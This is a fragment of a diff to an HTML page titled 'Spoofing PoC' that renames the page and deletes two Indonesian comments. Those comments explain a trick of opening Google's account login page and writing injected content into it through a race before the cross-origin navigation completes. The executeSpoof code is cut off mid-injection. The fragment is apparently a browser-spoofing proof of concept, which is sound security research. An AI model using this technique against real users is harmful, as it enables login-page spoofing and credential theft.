@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Spoofing PoC - Combined</title>
+  <title>Spoofing PoC - k4tedu</title>
   <style>
     body {
       display: flex;
@@ -26,10 +26,7 @@
 
   <script>
     function executeSpoof() {
-      // 1. Menggunakan _top / window.open dengan path spesifik untuk menghindari Universal Links
       let win = window.open('https://accounts.google.com/', '_top');
-
-      // 2. Race Condition: Injeksikan DOM sebelum navigasi cross-origin diselesaikan penuh oleh browser
       setTimeout(() => {
         try {
           win.document.write(`
